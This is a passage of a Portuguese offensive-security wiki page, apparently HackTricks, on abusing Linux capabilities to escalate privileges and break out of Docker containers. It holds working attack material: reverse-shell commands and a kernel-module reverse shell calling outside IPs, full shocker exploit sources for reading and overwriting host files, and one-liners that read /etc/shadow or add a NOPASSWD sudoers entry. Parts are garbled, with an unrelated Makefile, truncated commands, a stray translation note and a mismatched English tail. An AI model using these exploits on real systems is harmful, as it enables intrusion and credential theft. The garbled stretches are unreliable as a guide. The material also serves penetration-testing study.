(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Você não será capaz de ver a saída do comando executado, mas ele será executado por aquele processo (para obter um shell reverso).

{% hint style="warning" %}
Se você receber o erro "No symbol "system" in current context.", verifique o exemplo anterior de carregamento de shellcode em um programa via gdb.
{% endhint %}

**Exemplo com ambiente (Docker breakout) - Injeção de Shellcode**

Você pode verificar as capacidades habilitadas dentro do contêiner Docker usando:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Liste **processos** em execução no **host** `ps -eaf`

1. Obtenha a **arquitetura** `uname -m`
2. Encontre um **shellcode** para a arquitetura ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Encontre um **programa** para **injetar** o **shellcode** na memória de um processo ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
4. **Modifique** o **shellcode** dentro do programa e **compile** `gcc inject.c -o inject`
5. **Injete** e obtenha seu **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP\_SYS\_MODULE

[**CAP\_SYS\_MODULE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite que o processo carregue e descarregue módulos do kernel arbitrários (chamadas de sistema `init_module(2)`, `finit_module(2)` e `delete_module(2)`). Isso pode levar a uma escalada de privilégios trivial e comprometimento do anel-0. O kernel pode ser modificado à vontade, subvertendo toda a segurança do sistema, módulos de segurança do Linux e sistemas de contêineres.\
**Isso significa que você pode** **inserir/remover módulos do kernel no/do kernel da máquina hospedeira.**

**Exemplo com binário**

No exemplo a seguir, o binário **`python`** possui essa capacidade.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Por padrão, o comando **`modprobe`** verifica a lista de dependências e os arquivos de mapeamento no diretório **`/lib/modules/$(uname -r)`**.\
Para abusar disso, vamos criar uma pasta falsa **lib/modules**:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Em seguida, **compile o módulo do kernel que você pode encontrar 2 exemplos abaixo e copie** para esta pasta:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Finalmente, execute o código Python necessário para carregar este módulo do kernel:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Exemplo 2 com binário**

No exemplo a seguir, o binário **`kmod`** possui essa capacidade.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
O que significa que é possível usar o comando **`insmod`** para inserir um módulo de kernel. Siga o exemplo abaixo para obter um **shell reverso** abusando desse privilégio.

**Exemplo com ambiente (Docker breakout)**

Você pode verificar as capacidades habilitadas dentro do contêiner Docker usando:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Dentro da saída anterior, você pode ver que a capacidade **SYS\_MODULE** está habilitada.

**Crie** o **módulo do kernel** que irá executar um shell reverso e o **Makefile** para **compilá-lo**:

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% endcode %}

{% code title="Makefile" %}

Este é um exemplo de um arquivo Makefile que pode ser usado para compilar um programa em C:

```makefile
CC=gcc
CFLAGS=-Wall -Wextra -pedantic -std=c99

all: programa

programa: programa.c
	$(CC) $(CFLAGS) -o programa programa.c

clean:
	rm -f programa
```

Este Makefile define duas regras: `all` e `clean`. A regra `all` compila o programa usando o compilador `gcc` com as opções de compilação definidas em `CFLAGS`. A regra `clean` remove o arquivo executável gerado pela regra `all`.
```bash
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
O caractere em branco antes de cada palavra "make" no Makefile **deve ser um tab, não espaços**!
{% endhint %}

Execute `make` para compilá-lo.
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Finalmente, inicie o `nc` dentro de um shell e **carregue o módulo** a partir de outro e você capturará o shell no processo nc:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**O código desta técnica foi copiado do laboratório "Abusing SYS\_MODULE Capability" de** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Outro exemplo desta técnica pode ser encontrado em [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite que um processo **ignore as permissões de leitura de arquivos e de leitura e execução de diretórios**. Embora tenha sido projetado para ser usado para pesquisar ou ler arquivos, ele também concede ao processo permissão para invocar `open_by_handle_at(2)`. Qualquer processo com a capacidade `CAP_DAC_READ_SEARCH` pode usar `open_by_handle_at(2)` para acessar qualquer arquivo, mesmo arquivos fora do seu namespace de montagem. O identificador passado para `open_by_handle_at(2)` é destinado a ser um identificador opaco recuperado usando `name_to_handle_at(2)`. No entanto, este identificador contém informações sensíveis e manipuláveis, como números de inode. Isso foi mostrado pela primeira vez como um problema em contêineres Docker por Sebastian Krahmer com o exploit [shocker](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).\
**Isso significa que você pode ignorar as verificações de permissão de leitura de arquivos e de leitura/execução de diretórios.**

**Exemplo com binário**

O binário será capaz de ler qualquer arquivo. Então, se um arquivo como tar tiver essa capacidade, ele será capaz de ler o arquivo shadow:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Exemplo com binary2**

Neste caso, vamos supor que o binário **`python`** tenha essa capacidade. Para listar arquivos raiz, você pode fazer:
```python
import os
for r, d, f in os.walk('/root'):
    for filename in f:
        print(filename)
```
E para ler um arquivo você pode fazer:
```python
print(open("/etc/shadow", "r").read())
```
**Exemplo no Ambiente (Docker breakout)**

Você pode verificar as capacidades habilitadas dentro do container Docker usando:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Dentro da saída anterior, você pode ver que a capacidade **DAC\_READ\_SEARCH** está habilitada. Como resultado, o contêiner pode **depurar processos**.

Você pode aprender como funciona a exploração a seguir em [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), mas, em resumo, **CAP\_DAC\_READ\_SEARCH** não apenas nos permite percorrer o sistema de arquivos sem verificações de permissão, mas também remove explicitamente quaisquer verificações em _**open\_by\_handle\_at(2)**_ e **pode permitir que nosso processo acesse arquivos sensíveis abertos por outros processos**.

O exploit original que abusa dessas permissões para ler arquivos do host pode ser encontrado aqui: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), o seguinte é uma **versão modificada que permite indicar o arquivo que você deseja ler como primeiro argumento e despejá-lo em um arquivo.**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
    unsigned int handle_bytes;
    int handle_type;
    unsigned char f_handle[8];
};

void die(const char *msg)
{
    perror(msg);
    exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
    fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
    h->handle_type);
    for (int i = 0; i < h->handle_bytes; ++i) {
        fprintf(stderr,"0x%02x", h->f_handle[i]);
        if ((i + 1) % 20 == 0)
        fprintf(stderr,"\n");
        if (i < h->handle_bytes - 1)
        fprintf(stderr,", ");
    }
    fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
    int fd;
    uint32_t ino = 0;
    struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
    };
    DIR *dir = NULL;
    struct dirent *de = NULL;
    path = strchr(path, '/');
    // recursion stops if path has been resolved
    if (!path) {
        memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
        oh->handle_type = 1;
        oh->handle_bytes = 8;
        return 1;
    }

    ++path;
    fprintf(stderr, "[*] Resolving '%s'\n", path);
    if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
        die("[-] open_by_handle_at");
    if ((dir = fdopendir(fd)) == NULL)
        die("[-] fdopendir");
    for (;;) {
        de = readdir(dir);
        if (!de)
        break;
        fprintf(stderr, "[*] Found %s\n", de->d_name);
        if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
            fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
            ino = de->d_ino;
            break;
        }
    }

    fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
    if (de) {
        for (uint32_t i = 0; i < 0xffffffff; ++i) {
            outh.handle_bytes = 8;
            outh.handle_type = 1;
            memcpy(outh.f_handle, &ino, sizeof(ino));
            memcpy(outh.f_handle + 4, &i, sizeof(i));
            if ((i % (1<<20)) == 0)
                fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
            if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
                closedir(dir);
                close(fd);
                dump_handle(&outh);
                return find_handle(bfd, path, &outh, oh);
            }
        }
    }
    closedir(dir);
    close(fd);
    return 0;
}


int main(int argc,char* argv[] )
{
    char buf[0x1000];
    int fd1, fd2;
    struct my_file_handle h;
    struct my_file_handle root_h = {
        .handle_bytes = 8,
        .handle_type = 1,
        .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
    };
    
    fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
    
    read(0, buf, 1);
    
    // get a FS reference from something mounted in from outside
    if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
        die("[-] open");
    
    if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
        die("[-] Cannot find valid handle!");
    
    fprintf(stderr, "[!] Got a final handle!\n");
    dump_handle(&h);
    
    if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
        die("[-] open_by_handle");
    
    memset(buf, 0, sizeof(buf));
    if (read(fd2, buf, sizeof(buf) - 1) < 0)
        die("[-] read");
    
    printf("Success!!\n");
    
    FILE *fptr;
    fptr = fopen(argv[2], "w");
    fprintf(fptr,"%s", buf);
    fclose(fptr);
    
    close(fd2); close(fd1);
    
    return 0;
}
```
{% hint style="warning" %}
Eu exploro necessidades para encontrar um ponteiro para algo montado no host. O exploit original usava o arquivo /.dockerinit e esta versão modificada usa /etc/hostname. Se o exploit não estiver funcionando, talvez você precise definir um arquivo diferente. Para encontrar um arquivo que está montado no host, basta executar o comando mount:
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**O código desta técnica foi copiado do laboratório "Abusing DAC\_READ\_SEARCH Capability" de** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) é o evento de cibersegurança mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a missão de promover o conhecimento técnico**, este congresso é um ponto de encontro fervilhante para profissionais de tecnologia e cibersegurança em todas as disciplinas.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**Isso significa que você pode ignorar as verificações de permissão de gravação em qualquer arquivo, portanto, pode gravar qualquer arquivo.**

Existem muitos arquivos que você pode **sobrescrever para escalar privilégios,** [**você pode obter ideias aqui**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Exemplo com binário**

Neste exemplo, o vim tem essa capacidade, portanto, você pode modificar qualquer arquivo como _passwd_, _sudoers_ ou _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Exemplo com binário 2**

Neste exemplo, o binário **`python`** terá essa capacidade. Você poderia usar o python para substituir qualquer arquivo:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Exemplo com ambiente + CAP\_DAC\_READ\_SEARCH (Docker breakout)**

Você pode verificar as capacidades habilitadas dentro do contêiner Docker usando:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Antes de tudo, leia a seção anterior que [**abusa da capacidade DAC\_READ\_SEARCH para ler arquivos arbitrários**](linux-capabilities.md#cap\_dac\_read\_search) do host e **compile** o exploit.\
Em seguida, **compile a seguinte versão do exploit shocker** que permitirá que você **escreva arquivos arbitrários** no sistema de arquivos do host:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd 

struct my_file_handle {
  unsigned int handle_bytes;
  int handle_type;
  unsigned char f_handle[8];
};
void die(const char * msg) {
  perror(msg);
  exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
  fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
    h -> handle_type);
  for (int i = 0; i < h -> handle_bytes; ++i) {
    fprintf(stderr, "0x%02x", h -> f_handle[i]);
    if ((i + 1) % 20 == 0)
      fprintf(stderr, "\n");
    if (i < h -> handle_bytes - 1)
      fprintf(stderr, ", ");
  }
  fprintf(stderr, "};\n");
} 
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
  int fd;
  uint32_t ino = 0;
  struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
  };
  DIR * dir = NULL;
  struct dirent * de = NULL;
  path = strchr(path, '/');
  // recursion stops if path has been resolved
  if (!path) {
    memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
    oh -> handle_type = 1;
    oh -> handle_bytes = 8;
    return 1;
  }
  ++path;
  fprintf(stderr, "[*] Resolving '%s'\n", path);
  if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
    die("[-] open_by_handle_at");
  if ((dir = fdopendir(fd)) == NULL)
    die("[-] fdopendir");
  for (;;) {
    de = readdir(dir);
    if (!de)
      break;
    fprintf(stderr, "[*] Found %s\n", de -> d_name);
    if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
      fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
      ino = de -> d_ino;
      break;
    }
  }
  fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
  if (de) {
    for (uint32_t i = 0; i < 0xffffffff; ++i) {
      outh.handle_bytes = 8;
      outh.handle_type = 1;
      memcpy(outh.f_handle, & ino, sizeof(ino));
      memcpy(outh.f_handle + 4, & i, sizeof(i));
      if ((i % (1 << 20)) == 0)
        fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
      if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
        closedir(dir);
        close(fd);
        dump_handle( & outh);
        return find_handle(bfd, path, & outh, oh);
      }
    }
  }
  closedir(dir);
  close(fd);
  return 0;
}
int main(int argc, char * argv[]) {
  char buf[0x1000];
  int fd1, fd2;
  struct my_file_handle h;
  struct my_file_handle root_h = {
    .handle_bytes = 8,
    .handle_type = 1,
    .f_handle = {
      0x02,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    }
  };
  fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
  read(0, buf, 1);
  // get a FS reference from something mounted in from outside
  if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
    die("[-] open");
  if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
    die("[-] Cannot find valid handle!");
  fprintf(stderr, "[!] Got a final handle!\n");
  dump_handle( & h);
  if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
    die("[-] open_by_handle");
  char * line = NULL;
  size_t len = 0;
  FILE * fptr;
  ssize_t read;
  fptr = fopen(argv[2], "r");
  while ((read = getline( & line, & len, fptr)) != -1) {
    write(fd2, line, read);
  }
  printf("Success!!\n");
  close(fd2);
  close(fd1);
  return 0;
}
```
Para escapar do contêiner docker, você pode **baixar** os arquivos `/etc/shadow` e `/etc/passwd` do host, **adicionar** a eles um **novo usuário** e usar **`shocker_write`** para sobrescrevê-los. Em seguida, **acessar** via **ssh**.

**O código desta técnica foi copiado do laboratório "Abusing DAC\_OVERRIDE Capability" de** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**Isso significa que é possível alterar a propriedade de qualquer arquivo.**

**Exemplo com binário**

Suponha que o binário **`python`** tenha essa capacidade, você pode **alterar** o **proprietário** do arquivo **shadow**, **alterar a senha de root** e escalar privilégios:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Ou com o binário **`ruby`** tendo essa capacidade:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

Isso significa que é possível alterar as permissões de qualquer arquivo.

Exemplo com binário:

Se o Python tiver essa capacidade, você pode modificar as permissões do arquivo shadow, **alterar a senha de root** e escalar privilégios:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

Isso significa que é possível definir o ID de usuário efetivo do processo criado.

Exemplo com binário

Se o Python tiver essa **capacidade**, você pode facilmente abusar dela para escalar privilégios para root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Outra maneira:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**Isso significa que é possível definir o ID de grupo efetivo do processo criado.**

Existem muitos arquivos que você pode **sobrescrever para escalar privilégios,** [**você pode obter ideias aqui**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Exemplo com binário**

Nesse caso, você deve procurar por arquivos interessantes que um grupo possa ler, porque você pode se passar por qualquer grupo:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Uma vez que você encontrou um arquivo que pode ser abusado (por meio de leitura ou escrita) para escalar privilégios, você pode **obter um shell se passando pelo grupo interessante** com:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
Neste caso, o grupo shadow foi falsificado, então você pode ler o arquivo `/etc/shadow`:
```bash
cat /etc/shadow
```
Se o **docker** estiver instalado, você pode **se passar pelo grupo docker** e abusar dele para se comunicar com o [**socket do docker** e escalar privilégios](./#writable-docker-socket).

## CAP\_SETFCAP

**Isso significa que é possível definir capacidades em arquivos e processos**

**Exemplo com binário**

Se o Python tiver essa **capacidade**, você pode facilmente abusar dela para escalar privilégios para root:

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
    print (cap + " was successfully added to " + path)
```
{% endcode %} (This tag should not be translated)
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
Observe que se você definir uma nova capacidade para o binário com CAP\_SETFCAP, você perderá essa capacidade.
{% endhint %}

Depois de obter a [capacidade SETUID](linux-capabilities.md#cap\_setuid), você pode ir para a seção correspondente para ver como escalar privilégios.

**Exemplo com ambiente (Docker breakout)**

Por padrão, a capacidade **CAP\_SETFCAP é dada ao processo dentro do contêiner no Docker**. Você pode verificar isso fazendo algo como:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000
                                                                                                                     
apsh --decode=00000000a80425fb         
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Esta capacidade permite **dar a qualquer binário outra capacidade**, então poderíamos pensar em **escapar** do contêiner **abusando de qualquer uma das outras quebras de capacidade** mencionadas nesta página.\
No entanto, se você tentar dar, por exemplo, as capacidades CAP\_SYS\_ADMIN e CAP\_SYS\_PTRACE ao binário gdb, você descobrirá que pode dá-las, mas o **binário não poderá ser executado depois disso**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
Depois de investigar, li o seguinte: _Permitido: este é um **subconjunto limitante para as capacidades efetivas** que a thread pode assumir. Também é um subconjunto limitante para as capacidades que podem ser adicionadas ao conjunto herdável por uma thread que **não possui a capacidade CAP\_SETPCAP** em seu conjunto efetivo._\
Parece que as capacidades Permitidas limitam aquelas que podem ser usadas.\
No entanto, o Docker também concede o **CAP\_SETPCAP** por padrão, então você pode ser capaz de **definir novas capacidades dentro das herdáveis**.\
No entanto, na documentação dessa capacidade: _CAP\_SETPCAP: \[...\] **adicionar qualquer capacidade do conjunto de limites da thread chamadora** ao seu conjunto herdável_.\
Parece que só podemos adicionar ao conjunto herdável as capacidades do conjunto de limites. O que significa que **não podemos colocar novas capacidades como CAP\_SYS\_ADMIN ou CAP\_SYS\_PTRACE no conjunto herdável para escalar privilégios**.

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) fornece uma série de operações sensíveis, incluindo acesso a `/dev/mem`, `/dev/kmem` ou `/proc/kcore`, modificar `mmap_min_addr`, acessar chamadas de sistema `ioperm(2)` e `iopl(2)`, e vários comandos de disco. O `ioctl(2) FIBMAP` também é habilitado por meio dessa capacidade, o que causou problemas no [passado](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Conforme a página do manual, isso também permite que o detentor **execute descritivamente uma série de operações específicas do dispositivo em outros dispositivos**.

Isso pode ser útil para **escalada de privilégios** e **quebra de segurança do Docker**.

## CAP\_KILL

**Isso significa que é possível matar qualquer processo.**

**Exemplo com binário**

Vamos supor que o binário **`python`** tenha essa capacidade. Se você pudesse **também modificar alguma configuração de serviço ou soquete** (ou qualquer arquivo de configuração relacionado a um serviço), poderia colocar uma porta dos fundos nele e, em seguida, matar o processo relacionado a esse serviço e esperar que o novo arquivo de configuração seja executado com sua porta dos fundos.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc com kill**

Se você tiver capacidades de kill e houver um **programa node em execução como root** (ou como um usuário diferente), você provavelmente poderá **enviar** o **sinal SIGUSR1** e fazer com que ele **abra o depurador do node** para que você possa se conectar.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) é o evento de cibersegurança mais relevante na Espanha e um dos mais importantes na Europa. Com a missão de promover o conhecimento técnico, este congresso é um ponto de encontro fervilhante para profissionais de tecnologia e cibersegurança em todas as disciplinas.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

Isso significa que é possível ouvir em qualquer porta (mesmo em portas privilegiadas). Você não pode escalar privilégios diretamente com essa capacidade.

**Exemplo com binário**

Se o **`python`** tiver essa capacidade, ele poderá ouvir em qualquer porta e até mesmo se conectar a qualquer outra porta (alguns serviços exigem conexões de portas de privilégios específicos).

{% tabs %}
{% tab title="Ouvir" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
        output = connection.recv(1024).strip();
        print(output)
```
{% endtab %}

{% tab title="Linux Capabilities" %}
# Linux Capabilities

Linux Capabilities are a way to split the privileges of a process into smaller pieces. This way, a process can be granted only the privileges it needs to do its job, instead of running with full root privileges.

## List Capabilities

To list the capabilities of a process, you can use the `getpcaps` command:

```bash
